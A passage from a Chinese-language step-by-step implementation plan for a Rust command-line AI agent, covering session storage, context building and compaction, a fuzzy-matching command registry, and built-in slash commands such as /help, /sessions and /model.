    fn test_build_context() {
        let mut sm = SessionManager::new("test-3".into());
        sm.begin_turn(make_user_msg("hello"));
        sm.complete_turn().unwrap();

        let ctx = sm.build_context("You are helpful. Be concise.", &[], "", &[], None);
        assert_eq!(ctx.first().unwrap().role, Role::System);
        assert!(ctx.iter().any(|m| matches!(&m.content, Content::Text(t) if t == "hello")));
    }

    #[test]
    fn test_estimated_tokens_positive() {
        let mut sm = SessionManager::new("test-4".into());
        sm.begin_turn(make_user_msg("hello world this is a test message"));
        let tokens = sm.estimated_tokens();
        assert!(tokens > 0);
    }

    #[test]
    fn test_clear() {
        let mut sm = SessionManager::new("test-5".into());
        sm.begin_turn(make_user_msg("hello"));
        sm.complete_turn().unwrap();
        sm.clear();
        assert_eq!(sm.turns().len(), 0);
    }
}
```

- [ ] **步骤 2: 更新 src/lib.rs 添加 session 模块**

```rust
pub mod session;
```

- [ ] **步骤 3: 验证编译和测试**

运行: `cargo test -p emergence session`
预期: 测试通过

- [ ] **步骤 4: 提交**

```bash
git add src/session/ src/lib.rs
git commit -m "feat: 实现 Session 类型与 SessionManager — Turn、build_context、token 估算"
```

---

### 任务 14: SessionStore trait 与 JsonFileStore

**文件:**
- 创建: `src/session/store.rs`
- 修改: `src/session/mod.rs`

- [ ] **步骤 1: 编写 store.rs**

```rust
use std::path::{Path, PathBuf};
use async_trait::async_trait;
use super::{Session, SessionId, SessionKey, SessionMeta};
use chrono::Utc;

/// 会话持久化 trait
#[async_trait]
pub trait SessionStore: Send + Sync {
    async fn save(&self, session: &Session) -> anyhow::Result<()>;
    async fn load(&self, key: &SessionKey) -> anyhow::Result<Option<Session>>;
    async fn list(&self) -> anyhow::Result<Vec<SessionMeta>>;
    async fn delete(&self, key: &SessionKey) -> anyhow::Result<()>;
    async fn set_alias(&self, id: &str, alias: &str) -> anyhow::Result<()>;
}

/// JSON 文件存储实现
pub struct JsonFileStore {
    store_dir: PathBuf,
}

impl JsonFileStore {
    pub fn new(store_dir: PathBuf) -> Self {
        Self { store_dir }
    }

    fn index_path(&self) -> PathBuf {
        self.store_dir.join("index.json")
    }

    fn session_path(&self, id: &str) -> PathBuf {
        self.store_dir.join(format!("{}.json", id))
    }

    async fn read_index(&self) -> anyhow::Result<Vec<SessionMeta>> {
        if self.index_path().exists() {
            let content = tokio::fs::read_to_string(self.index_path()).await?;
            let metas: Vec<SessionMeta> = serde_json::from_str(&content)?;
            return Ok(metas);
        }
        Ok(Vec::new())
    }

    async fn write_index(&self, metas: &[SessionMeta]) -> anyhow::Result<()> {
        tokio::fs::create_dir_all(&self.store_dir).await?;
        let json = serde_json::to_string_pretty(metas)?;
        tokio::fs::write(self.index_path(), json).await?;
        Ok(())
    }

    /// 解析别名到 SessionId
    async fn resolve_key(&self, key: &SessionKey) -> anyhow::Result<Option<SessionId>> {
        match key {
            SessionKey::Id(id) => {
                if self.session_path(id).exists() {
                    Ok(Some(id.clone()))
                } else {
                    Ok(None)
                }
            }
            SessionKey::Alias(alias) => {
                let index = self.read_index().await?;
                let found = index.iter().find(|m| m.alias.as_deref() == Some(alias));
                Ok(found.map(|m| m.id.clone()))
            }
        }
    }
}

#[async_trait]
impl SessionStore for JsonFileStore {
    async fn save(&self, session: &Session) -> anyhow::Result<()> {
        tokio::fs::create_dir_all(&self.store_dir).await?;

        // 保存会话文件
        let json = serde_json::to_string_pretty(session)?;
        tokio::fs::write(self.session_path(&session.id), json).await?;

        // 更新索引
        let mut index = self.read_index().await?;
        let meta = SessionMeta {
            id: session.id.clone(),
            alias: session.alias.clone(),
            created_at: session.created_at,
            updated_at: session.updated_at,
            message_count: session.message_count(),
            summary: session.summary.clone(),
        };

        if let Some(pos) = index.iter().position(|m| m.id == session.id) {
            index[pos] = meta;
        } else {
            index.push(meta);
        }

        self.write_index(&index).await
    }

    async fn load(&self, key: &SessionKey) -> anyhow::Result<Option<Session>> {
        let id = self.resolve_key(key).await?;
        match id {
            Some(session_id) => {
                let path = self.session_path(&session_id);
                if path.exists() {
                    let json = tokio::fs::read_to_string(path).await?;
                    let session: Session = serde_json::from_str(&json)?;
                    Ok(Some(session))
                } else {
                    Ok(None)
                }
            }
            None => Ok(None),
        }
    }

    async fn list(&self) -> anyhow::Result<Vec<SessionMeta>> {
        self.read_index().await
    }

    async fn delete(&self, key: &SessionKey) -> anyhow::Result<()> {
        let id = self.resolve_key(key).await?;
        if let Some(session_id) = id {
            // 删除会话文件
            let path = self.session_path(&session_id);
            if path.exists() {
                tokio::fs::remove_file(path).await?;
            }
            // 更新索引
            let mut index = self.read_index().await?;
            index.retain(|m| m.id != session_id);
            self.write_index(&index).await?;
        }
        Ok(())
    }

    async fn set_alias(&self, id: &str, alias: &str) -> anyhow::Result<()> {
        let mut index = self.read_index().await?;
        if let Some(meta) = index.iter_mut().find(|m| m.id == id) {
            meta.alias = Some(alias.to_string());
            self.write_index(&index).await?;

            // 同时更新会话文件中的别名
            if let Some(session) = self.load(&SessionKey::Id(id.to_string())).await? {
                let mut session = session;
                session.alias = Some(alias.to_string());
                let json = serde_json::to_string_pretty(&session)?;
                tokio::fs::write(self.session_path(id), json).await?;
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::{Session, SessionManager, SessionKey};
    use crate::llm::{ChatMessage, Role, Content};

    #[tokio::test]
    async fn test_save_and_load() {
        let dir = tempfile::tempdir().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        let session = Session::new("2026-05-06-test".into());
        store.save(&session).await.unwrap();

        let loaded = store.load(&SessionKey::Id("2026-05-06-test".into())).await.unwrap();
        assert!(loaded.is_some());
        assert_eq!(loaded.unwrap().id, "2026-05-06-test");
    }

    #[tokio::test]
    async fn test_list_sessions() {
        let dir = tempfile::tempdir().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        store.save(&Session::new("s1".into())).await.unwrap();
        store.save(&Session::new("s2".into())).await.unwrap();

        let list = store.list().await.unwrap();
        assert_eq!(list.len(), 2);
    }

    #[tokio::test]
    async fn test_set_alias_and_load_by_alias() {
        let dir = tempfile::tempdir().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        store.save(&Session::new("s1".into())).await.unwrap();
        store.set_alias("s1", "my-session").await.unwrap();

        let loaded = store.load(&SessionKey::Alias("my-session".into())).await.unwrap();
        assert!(loaded.is_some());
        assert_eq!(loaded.unwrap().id, "s1");
    }

    #[tokio::test]
    async fn test_delete() {
        let dir = tempfile::tempdir().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());

        store.save(&Session::new("to-delete".into())).await.unwrap();
        store.delete(&SessionKey::Id("to-delete".into())).await.unwrap();

        let loaded = store.load(&SessionKey::Id("to-delete".into())).await.unwrap();
        assert!(loaded.is_none());
    }
}
```

- [ ] **步骤 2: 更新 src/session/mod.rs 添加 store 模块**

在 mod.rs 末尾添加：
```rust
pub mod store;
```

- [ ] **步骤 3: 运行测试**

运行: `cargo test -p emergence session::store`
预期: 测试通过

- [ ] **步骤 4: 提交**

```bash
git add src/session/
git commit -m "feat: 实现 SessionStore trait 与 JsonFileStore — 会话持久化、别名、索引管理"
```

---

### 任务 15: ContextBuilder 与 Compaction

**文件:**
- 创建: `src/session/context.rs`
- 创建: `src/session/summarizer.rs`
- 修改: `src/session/mod.rs`

- [ ] **步骤 1: 编写 summarizer.rs**

```rust
use crate::llm::ChatMessage;

/// 调用 LLM 生成对话摘要
pub struct Summarizer;

impl Summarizer {
    /// 生成压缩摘要（v1: 简单截断策略）
    /// 完整版需要调用 LLM，此处使用简单策略：
    /// 保留最近 N 个 Turn，将早期 Turn 压缩为摘要
    pub fn summarize_turns(turns: &[super::Turn], recent_keep: usize) -> String {
        if turns.len() <= recent_keep {
            return "".to_string();
        }

        let old_turns = &turns[..turns.len() - recent_keep];
        let mut summary = String::from("此前对话摘要:\n");

        for turn in old_turns {
            summary.push_str(&format!("[Turn {}]: ", turn.id));
            for msg in &turn.messages {
                match msg.role {
                    crate::llm::Role::User => {
                        if let crate::llm::Content::Text(ref t) = msg.content {
                            summary.push_str(&format!("用户: {} | ", t.chars().take(100).collect::<String>()));
                        }
                    }
                    crate::llm::Role::Assistant => {
                        if let crate::llm::Content::Text(ref t) = msg.content {
                            summary.push_str(&format!("助手: {} | ", t.chars().take(200).collect::<String>()));
                        }
                    }
                    _ => {}
                }
            }
            summary.push('\n');
        }

        summary
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::Turn;
    use crate::llm::{ChatMessage, Content, Role};
    use chrono::Utc;

    #[test]
    fn test_summarize_turns() {
        let turns: Vec<Turn> = (1..=5).map(|i| Turn {
            id: format!("turn-{}", i),
            messages: vec![
                ChatMessage { role: Role::User, content: Content::Text(format!("问题 {}", i)), name: None },
                ChatMessage { role: Role::Assistant, content: Content::Text(format!("回答 {}", i)), name: None },
            ],
            status: crate::session::TurnStatus::Completed,
            started_at: Utc::now(),
            completed_at: Some(Utc::now()),
            usage: Default::default(),
        }).collect();

        let summary = Summarizer::summarize_turns(&turns, 3);
        assert!(summary.contains("turn-1"));
        assert!(summary.contains("turn-2"));
        assert!(!summary.contains("turn-5")); // 保留最近 3 个
    }
}
```

- [ ] **步骤 2: 编写 context.rs — ContextBuilder**

```rust
use crate::llm::{ChatMessage, Content, Role, ToolDefinition};
use super::{Session, SessionManager};

/// ContextBuilder — 构建发送给 LLM 的上下文
pub struct ContextBuilder;

impl ContextBuilder {
    /// 构建完整上下文
    /// 上下文展开顺序（对齐设计 §6）：
    ///   SystemMessage(system_prompt + AGENTS.md + <available_skills> + tools)
    ///   → SkillContent(active_skill 1) → SkillContent(active_skill 2) → ...
    ///   → SummaryMessage → Turn[0].messages → Turn[1].messages → ...
    pub fn build(
        session: &Session,
        system_prompt: &str,
        tools: &[ToolDefinition],
        available_skills_text: &str,
        active_skill_contents: &[String],
        project_instructions: Option<&str>,
    ) -> Vec<ChatMessage> {
        let mut messages = Vec::new();

        // 1. System prompt 主内容
        let mut system_text = system_prompt.to_string();

        // 2. 添加 AGENTS.md 项目指令
        if let Some(instructions) = project_instructions {
            system_text.push_str(&format!("\n\n<project_instructions>\n{}\n</project_instructions>", instructions));
        }

        // 3. 添加可用 Skill 列表（轻量元信息，对齐设计 §8）
        if !available_skills_text.is_empty() {
            system_text.push_str("\n\n");
            system_text.push_str(available_skills_text);
        }

        // 4. 添加工具列表
        if !tools.is_empty() {
            system_text.push_str("\n\n<available_tools>");
            for tool in tools {
                system_text.push_str(&format!(
                    "\n- tool: {} | desc: {}",
                    tool.name, tool.description
                ));
            }
            system_text.push_str("\n</available_tools>");
        }

        messages.push(ChatMessage {
            role: Role::System,
            content: Content::Text(system_text),
            name: None,
        });

        // 5. 注入 Active Skills 的完整内容
        for skill_content in active_skill_contents {
            messages.push(ChatMessage {
                role: Role::System,
                content: Content::Text(skill_content.clone()),
                name: Some("skill".into()),
            });
        }

        // 6. 摘要（如有）
        if let Some(ref summary) = session.summary {
            messages.push(ChatMessage {
                role: Role::System,
                content: Content::Text(format!("<conversation_summary>\n{}\n</conversation_summary>", summary)),
                name: Some("summary".into()),
            });
        }

        // 7. 展开所有 Turn 消息
        for turn in &session.turns {
            for msg in &turn.messages {
                messages.push(msg.clone());
            }
        }

        messages
    }

    /// 估算 total token count
    pub fn estimated_tokens(messages: &[ChatMessage]) -> u32 {
        let char_count: usize = messages.iter()
            .map(|m| match &m.content {
                Content::Text(t) => t.len(),
                Content::Parts(parts) => parts.iter().map(|p| match p {
                    crate::llm::ContentPart::Text { text } => text.len(),
                    crate::llm::ContentPart::ToolUse { input, .. } => input.to_string().len(),
                    crate::llm::ContentPart::ToolResult { content, .. } => content.len(),
                }).sum(),
            })
            .sum();
        (char_count as f32 * 0.25) as u32
    }

    /// 执行压缩：保留最近 keep_recent 个 turn，将其余转为摘要
    pub fn compact(session: &mut Session, keep_recent: usize) {
        if session.turns.len() <= keep_recent {
            return;
        }

        let old_turns: Vec<_> = session.turns.drain(..session.turns.len() - keep_recent).collect();

        let summary = super::summarizer::Summarizer::summarize_turns(&old_turns, 0);
        session.summary = Some(summary);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::Session;
    use crate::llm::{ChatMessage, Content, Role};

    #[test]
    fn test_estimated_tokens() {
        let msgs = vec![
            ChatMessage {
                role: Role::User,
                content: Content::Text("hello world".into()),
                name: None,
            },
        ];
        let tokens = ContextBuilder::estimated_tokens(&msgs);
        assert!(tokens > 0);
        assert!(tokens < 50);
    }

    #[test]
    fn test_compact_reduces_turns() {
        let mut session = Session::new("test".into());
        for i in 0..5 {
            session.turns.push(crate::session::Turn {
                id: format!("t{}", i),
                messages: vec![],
                status: crate::session::TurnStatus::Completed,
                started_at: chrono::Utc::now(),
                completed_at: Some(chrono::Utc::now()),
                usage: Default::default(),
            });
        }
        ContextBuilder::compact(&mut session, 2);
        assert_eq!(session.turns.len(), 2);
        assert!(session.summary.is_some());
    }
}
```

- [ ] **步骤 3: 更新 src/session/mod.rs 添加模块声明**

在 mod.rs 末尾添加：
```rust
pub mod context;
pub mod summarizer;
```

- [ ] **步骤 4: 验证编译和测试**

运行: `cargo test -p emergence session::context -p emergence session::summarizer`
预期: 测试通过

- [ ] **步骤 5: 提交**

```bash
git add src/session/
git commit -m "feat: 实现 ContextBuilder 与 Compaction — token 估算、Turn 压缩、Summarizer"
```

---

### 任务 16: Command trait 与 CommandRegistry

**文件:**
- 创建: `src/commands/mod.rs`
- 创建: `src/utils/fuzzy.rs`
- 修改: `src/lib.rs`
- 修改: `src/utils/mod.rs`

- [ ] **步骤 1: 编写 commands/mod.rs**

```rust
use std::collections::HashMap;

/// 命令执行上下文 — 命令可访问的子系统引用
pub struct CommandContext<'a> {
    pub config: &'a mut crate::config::ConfigManager,
    pub session: &'a mut crate::session::SessionManager,
    pub model: &'a mut String,
    pub should_quit: &'a mut bool,
    pub skill_registry: Option<&'a crate::skills::SkillRegistry>,
    pub session_store: Option<&'a dyn crate::session::store::SessionStore>,
}

/// 命令执行输出
#[derive(Debug, Clone)]
pub enum CommandOutput {
    Success { message: String },
    Error { message: String },
    Quit,
    SwitchSession { session: crate::session::Session },
}

/// 命令元信息
#[derive(Debug, Clone)]
pub struct CommandMeta {
    pub name: String,
    pub aliases: Vec<String>,
    pub description: String,
    pub usage: String,
}

/// 建议项（模糊匹配用）
#[derive(Debug, Clone)]
pub struct Suggestion {
    pub name: String,
    pub distance: usize,
}

/// Command trait
#[async_trait::async_trait]
pub trait Command: Send + Sync {
    fn name(&self) -> &str;
    fn aliases(&self) -> &[&str] { &[] }
    fn description(&self) -> &str;
    fn usage(&self) -> &str;
    async fn execute(
        &self,
        args: &[String],
        ctx: &mut CommandContext<'_>,
    ) -> anyhow::Result<CommandOutput>;
}

/// 命令注册表
pub struct CommandRegistry {
    commands: HashMap<String, Box<dyn Command>>,
    /// 所有已知命令名（用于模糊匹配）
    known_names: Vec<String>,
}

impl CommandRegistry {
    pub fn new() -> Self {
        Self {
            commands: HashMap::new(),
            known_names: Vec::new(),
        }
    }

    pub fn register<C: Command + 'static>(&mut self, cmd: C) {
        let name = cmd.name().to_string();
        for alias in cmd.aliases() {
            self.known_names.push(alias.to_string());
        }
        self.known_names.push(name.clone());
        self.commands.insert(name, Box::new(cmd));
    }

    /// 解析 /command input 并分发
    pub async fn dispatch(
        &self,
        input: &str,
        ctx: &mut CommandContext<'_>,
    ) -> anyhow::Result<CommandOutput> {
        let trimmed = input.trim().trim_start_matches('/');
        let parts: Vec<&str> = trimmed.split_whitespace().collect();

        if parts.is_empty() {
            return Ok(CommandOutput::Error { message: "空命令".into() });
        }

        let name = parts[0];
        let args: Vec<String> = parts[1..].iter().map(|s| s.to_string()).collect();

        // 精确匹配
        if let Some(cmd) = self.commands.get(name) {
            return cmd.execute(&args, ctx).await;
        }

        // 别名匹配
        for (_, cmd) in &self.commands {
            if cmd.aliases().contains(&name) {
                return cmd.execute(&args, ctx).await;
            }
        }

        // 模糊匹配
        let suggestions = self.fuzzy_find(name);
        if !suggestions.is_empty() {
            let hint = suggestions.iter()
                .map(|s| format!("→ /{} ({})", s.name, s.distance))
                .collect::<Vec<_>>()
                .join("\n");
            return Ok(CommandOutput::Error {
                message: format!("未知命令 '/{}'。你可能是想:\n{}", name, hint),
            });
        }

        Ok(CommandOutput::Error {
            message: format!("未知命令 '/{}'。输入 /help 查看所有命令。", name),
        })
    }

    /// 模糊匹配（Levenshtein 距离 ≤ 3）
    pub fn fuzzy_find(&self, input: &str) -> Vec<Suggestion> {
        let mut suggestions: Vec<Suggestion> = self.known_names
            .iter()
            .filter_map(|name| {
                let distance = crate::utils::fuzzy::levenshtein_distance(input, name);
                if distance <= 3 {
                    Some(Suggestion { name: name.clone(), distance })
                } else {
                    None
                }
            })
            .collect();
        suggestions.sort_by_key(|s| s.distance);
        suggestions.truncate(3);
        suggestions
    }

    pub fn list(&self) -> Vec<CommandMeta> {
        let mut seen = std::collections::HashSet::new();
        let mut metas = Vec::new();
        for (_, cmd) in &self.commands {
            if seen.insert(cmd.name().to_string()) {
                metas.push(CommandMeta {
                    name: cmd.name().to_string(),
                    aliases: cmd.aliases().iter().map(|s| s.to_string()).collect(),
                    description: cmd.description().to_string(),
                    usage: cmd.usage().to_string(),
                });
            }
        }
        metas
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct TestCommand;

    #[async_trait::async_trait]
    impl Command for TestCommand {
        fn name(&self) -> &str { "test" }
        fn aliases(&self) -> &[&str] { &["t"] }
        fn description(&self) -> &str { "测试命令" }
        fn usage(&self) -> &str { "/test" }
        async fn execute(&self, _args: &[String], _ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
            Ok(CommandOutput::Success { message: "ok".into() })
        }
    }

    #[test]
    fn test_register_and_list() {
        let mut registry = CommandRegistry::new();
        registry.register(TestCommand);
        let list = registry.list();
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].name, "test");
    }

    #[test]
    fn test_fuzzy_find() {
        let mut registry = CommandRegistry::new();
        registry.register(TestCommand);
        let suggestions = registry.fuzzy_find("tst");
        assert!(!suggestions.is_empty());
    }
}
```

- [ ] **步骤 2: 更新 src/lib.rs 添加 commands 和 skills 模块**

```rust
pub mod commands;
pub mod skills;
```

- [ ] **步骤 3: 创建占位 skills 模块**

创建 `src/skills/mod.rs`：
```rust
// 将在任务 20 中实现完整 Skill 系统
pub struct SkillRegistry;

impl SkillRegistry {
    pub fn new() -> Self { Self }
}
```

- [ ] **步骤 4: 创建 fuzzy 工具**

创建 `src/utils/fuzzy.rs`：
```rust
/// 计算两个字符串的 Levenshtein 编辑距离
pub fn levenshtein_distance(s1: &str, s2: &str) -> usize {
    let len1 = s1.chars().count();
    let len2 = s2.chars().count();

    if len1 == 0 { return len2; }
    if len2 == 0 { return len1; }

    let chars1: Vec<char> = s1.chars().collect();
    let chars2: Vec<char> = s2.chars().collect();

    let mut prev_row: Vec<usize> = (0..=len2).collect();
    let mut curr_row = vec![0usize; len2 + 1];

    for i in 1..=len1 {
        curr_row[0] = i;
        for j in 1..=len2 {
            let cost = if chars1[i - 1] == chars2[j - 1] { 0 } else { 1 };
            curr_row[j] = (prev_row[j] + 1)
                .min(curr_row[j - 1] + 1)
                .min(prev_row[j - 1] + cost);
        }
        std::mem::swap(&mut prev_row, &mut curr_row);
    }

    prev_row[len2]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_same_string() {
        assert_eq!(levenshtein_distance("hello", "hello"), 0);
    }

    #[test]
    fn test_one_edit() {
        assert_eq!(levenshtein_distance("compac", "compact"), 1);
    }

    #[test]
    fn test_completely_different() {
        assert_eq!(levenshtein_distance("abc", "xyz"), 3);
    }
}
```

更新 `src/utils/mod.rs`：
```rust
pub mod env;
pub mod fuzzy;
```

- [ ] **步骤 5: 验证编译和测试**

运行: `cargo test -p emergence commands -p emergence utils::fuzzy`
预期: 测试通过

- [ ] **步骤 6: 提交**

```bash
git add src/commands/ src/skills/ src/utils/ src/lib.rs
git commit -m "feat: 实现 Command trait、CommandRegistry 与模糊匹配 — Levenshtein 编辑距离"
```

---

### 任务 17: 内置斜杠命令实现

**文件:**
- 创建: `src/commands/help.rs`
- 创建: `src/commands/clear.rs`
- 创建: `src/commands/compact_cmd.rs`
- 创建: `src/commands/config_cmd.rs`
- 创建: `src/commands/sessions_cmd.rs`
- 创建: `src/commands/quit.rs`
- 创建: `src/commands/model_cmd.rs`
- 创建: `src/commands/tokens_cmd.rs`
- 创建: `src/commands/tools_cmd.rs`
- 创建: `src/commands/skills_cmd.rs`
- 修改: `src/commands/mod.rs`

- [ ] **步骤 1: 编写 help.rs**

```rust
use super::*;

pub struct HelpCommand {
    metas: Vec<CommandMeta>,
}

impl HelpCommand {
    pub fn new(metas: Vec<CommandMeta>) -> Self {
        Self { metas }
    }
}

#[async_trait::async_trait]
impl Command for HelpCommand {
    fn name(&self) -> &str { "help" }
    fn aliases(&self) -> &[&str] { &["?"] }
    fn description(&self) -> &str { "列出所有命令或查看某命令详情" }
    fn usage(&self) -> &str { "/help [command]" }

    async fn execute(&self, args: &[String], _ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        if let Some(cmd_name) = args.first() {
            // 查找特定命令的详情
            for meta in &self.metas {
                if meta.name == *cmd_name || meta.aliases.iter().any(|a| a == cmd_name) {
                    let aliases_str = if meta.aliases.is_empty() {
                        String::new()
                    } else {
                        format!(" ({})", meta.aliases.join(", "))
                    };
                    return Ok(CommandOutput::Success {
                        message: format!("/{} — {}{}\n用法: {}", meta.name, meta.description, aliases_str, meta.usage),
                    });
                }
            }
            return Ok(CommandOutput::Error {
                message: format!("未找到命令 '/{}'", cmd_name),
            });
        }

        let mut msg = String::from("emergence 命令列表:\n\n");
        for meta in &self.metas {
            let alias_str = if meta.aliases.is_empty() {
                String::new()
            } else {
                format!(" ({})", meta.aliases.join(", "))
            };
            msg.push_str(&format!("  /{:12} - {}{}\n", meta.name, meta.description, alias_str));
        }
        Ok(CommandOutput::Success { message: msg })
    }
}
```

- [ ] **步骤 2: 编写 clear.rs**

```rust
use super::*;

pub struct ClearCommand;

#[async_trait::async_trait]
impl Command for ClearCommand {
    fn name(&self) -> &str { "clear" }
    fn description(&self) -> &str { "清空当前对话上下文，保留 system prompt" }
    fn usage(&self) -> &str { "/clear" }

    async fn execute(&self, _args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        ctx.session.clear();
        // 将清除事件返回给 TUI
        Ok(CommandOutput::Success {
            message: "已清空对话上下文。system prompt 和配置保留不变。".into(),
        })
    }
}
```

- [ ] **步骤 3: 编写 compact_cmd.rs**

```rust
use super::*;

pub struct CompactCommand;

#[async_trait::async_trait]
impl Command for CompactCommand {
    fn name(&self) -> &str { "compact" }
    fn description(&self) -> &str { "手动触发上下文压缩" }
    fn usage(&self) -> &str { "/compact [/compact status]" }

    async fn execute(&self, args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        if args.first().map(|s| s.as_str()) == Some("status") {
            let tokens = ctx.session.estimated_tokens();
            let threshold = ctx.config.settings.session.compaction_threshold_tokens;
            let should = ctx.session.should_compact(threshold);
            return Ok(CommandOutput::Success {
                message: format!(
                    "当前 token 用量: ~{} / {} (阈值 80%)\n状态: {}",
                    tokens,
                    threshold,
                    if should { "需要压缩" } else { "不需要压缩" }
                ),
            });
        }

        // 执行压缩
        let threshold = ctx.config.settings.session.compaction_threshold_tokens;
        if ctx.session.should_compact(threshold) {
            ctx.session.compact(3);
            Ok(CommandOutput::Success {
                message: format!("压缩完成。当前 token 用量: ~{}", ctx.session.estimated_tokens()),
            })
        } else {
            Ok(CommandOutput::Success {
                message: "当前 token 用量未达阈值，无需压缩。".into(),
            })
        }
    }
}
```

- [ ] **步骤 4: 编写 config_cmd.rs**

```rust
use super::*;

pub struct ConfigCommand;

#[async_trait::async_trait]
impl Command for ConfigCommand {
    fn name(&self) -> &str { "config" }
    fn description(&self) -> &str { "查看/修改配置" }
    fn usage(&self) -> &str { "/config [model <name>|reload]" }

    async fn execute(&self, args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        match args.first().map(|s| s.as_str()) {
            Some("model") => {
                if let Some(model) = args.get(1) {
                    *ctx.model = model.clone();
                    ctx.config.settings.model.clone_from(model);
                    Ok(CommandOutput::Success {
                        message: format!("模型已切换为: {}", model),
                    })
                } else {
                    Ok(CommandOutput::Success {
                        message: format!("当前模型: {}", ctx.config.settings.model),
                    })
                }
            }
            Some("reload") => {
                ctx.config.reload()?;
                Ok(CommandOutput::Success {
                    message: "配置已重载。".into(),
                })
            }
            _ => {
                // 显示当前配置概要
                let s = &ctx.config.settings;
                let msg = format!(
                    "模型: {}\n生成参数: max_tokens={}, temperature={}, top_p={}\nProvider 数: {}\n会话目录: {}",
                    s.model,
                    s.generation.max_tokens,
                    s.generation.temperature,
                    s.generation.top_p,
                    s.providers.len(),
                    s.session.store_dir,
                );
                Ok(CommandOutput::Success { message: msg })
            }
        }
    }
}
```

- [ ] **步骤 5: 编写 sessions_cmd.rs**

```rust
use super::*;
use crate::session::SessionKey;

pub struct SessionsCommand;

#[async_trait::async_trait]
impl Command for SessionsCommand {
    fn name(&self) -> &str { "sessions" }
    fn aliases(&self) -> &[&str] { &["s"] }
    fn description(&self) -> &str { "列出、切换、删除、别名管理会话" }
    fn usage(&self) -> &str { "/sessions [list|load <id|alias>|delete <id|alias>|alias <name>]" }

    async fn execute(&self, args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        let store = ctx.session_store
            .ok_or_else(|| anyhow::anyhow!("SessionStore 不可用"))?;

        match args.first().map(|s| s.as_str()) {
            Some("list") | None => {
                let metas = store.list().await?;
                if metas.is_empty() {
                    return Ok(CommandOutput::Success {
                        message: "没有保存的会话。".into(),
                    });
                }
                let mut msg = format!("会话列表 ({} 个):\n\n", metas.len());
                for meta in &metas {
                    let current = if meta.id == ctx.session.session().id { " ← 当前" } else { "" };
                    let alias = meta.alias.as_deref().unwrap_or("-");
                    msg.push_str(&format!(
                        "  {} | 别名: {} | {} 条消息 | {}{}\n",
                        meta.id, alias, meta.message_count,
                        meta.updated_at.format("%Y-%m-%d %H:%M"), current,
                    ));
                }
                msg.push_str("\n使用 /sessions load <id|别名> 切换会话");
                Ok(CommandOutput::Success { message: msg })
            }
            Some("load") => {
                if let Some(key_str) = args.get(1) {
                    // 先尝试作为 id，再作为别名
                    let key = if key_str.chars().next().map_or(false, |c| c.is_ascii_digit()) {
                        SessionKey::Id(key_str.clone())
                    } else {
                        SessionKey::Alias(key_str.clone())
                    };
                    match store.load(&key).await? {
                        Some(session) => {
                            let id = session.id.clone();
                            // 通知 AgentLoop 切换会话
                            Ok(CommandOutput::SwitchSession { session })
                        }
                        None => Ok(CommandOutput::Error {
                            message: format!("未找到会话: {}", key_str),
                        }),
                    }
                } else {
                    Ok(CommandOutput::Error {
                        message: "用法: /sessions load <id|别名>".into(),
                    })
                }
            }
            Some("delete") => {
                if let Some(key_str) = args.get(1) {
                    let key = if key_str.chars().next().map_or(false, |c| c.is_ascii_digit()) {
                        SessionKey::Id(key_str.clone())
                    } else {
                        SessionKey::Alias(key_str.clone())
                    };
                    store.delete(&key).await?;
                    Ok(CommandOutput::Success {
                        message: format!("已删除会话: {}", key_str),
                    })
                } else {
                    Ok(CommandOutput::Error {
                        message: "用法: /sessions delete <id|别名>".into(),
                    })
                }
            }
            Some("alias") => {
                if let Some(alias) = args.get(1) {
                    let id = ctx.session.session().id.clone();
                    ctx.session.set_alias(alias.clone());
                    store.set_alias(&id, alias).await?;
                    Ok(CommandOutput::Success {
                        message: format!("已设置别名: {}", alias),
                    })
                } else {
                    Ok(CommandOutput::Error {
                        message: "用法: /sessions alias <name>".into(),
                    })
                }
            }
            _ => Ok(CommandOutput::Error {
                message: "用法: /sessions [list|load <id|别名>|delete <id|别名>|alias <name>]".into(),
            }),
        }
    }
}
```

- [ ] **步骤 6: 编写 quit.rs**

```rust
use super::*;

pub struct QuitCommand;

#[async_trait::async_trait]
impl Command for QuitCommand {
    fn name(&self) -> &str { "quit" }
    fn aliases(&self) -> &[&str] { &["q", "exit"] }
    fn description(&self) -> &str { "退出程序" }
    fn usage(&self) -> &str { "/quit" }

    async fn execute(&self, _args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        *ctx.should_quit = true;
        Ok(CommandOutput::Quit)
    }
}
```

- [ ] **步骤 7: 编写 model_cmd.rs**

```rust
use super::*;

pub struct ModelCommand;

#[async_trait::async_trait]
impl Command for ModelCommand {
    fn name(&self) -> &str { "model" }
    fn aliases(&self) -> &[&str] { &["m"] }
    fn description(&self) -> &str { "快速切换模型" }
    fn usage(&self) -> &str { "/model <provider/model>" }

    async fn execute(&self, args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
        if let Some(model) = args.first() {
            *ctx.model = model.clone();
            ctx.config.settings.model.clone_from(model);
            Ok(CommandOutput::Success {
                message: format!("已切换到模型: {}", model),
            })
        } else {
            Ok(CommandOutput::Success {
                message: format!("当前模型: {}", ctx.config.settings.model),
            })
        }
    }
}
```

- [ ] **步骤 8: 编写 tokens_cmd.rs**

```rust
use super::*;

pub struct TokensCommand;

#[async_trait::async_trait]
impl Command for TokensCommand {
    fn name(&self) -> &str { "tokens" }
    fn aliases(&self) -> &[&str] { &["t"] }
    fn description(&self) -> &str { "显示当前 token 用量详情" }
    fn usage(&self) -> &str { "/tokens" }

    async fn execute(&self, _args: &[String], ctx: &mut CommandContext<'_>) -> anyhow::Result<CommandOutput> {
